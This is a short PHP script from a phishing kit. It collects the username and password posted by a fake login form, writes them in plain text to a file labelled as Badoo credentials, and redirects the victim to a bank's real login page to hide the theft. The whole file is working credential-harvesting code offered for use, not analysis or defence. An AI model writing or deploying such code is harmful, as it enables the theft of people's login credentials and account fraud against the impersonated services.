<?php

file_put_contents("usernames.txt", "Badoo Username: " . $_POST['user'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.sucursalelectronica.com/redir/showLogin.go');
exit();
?>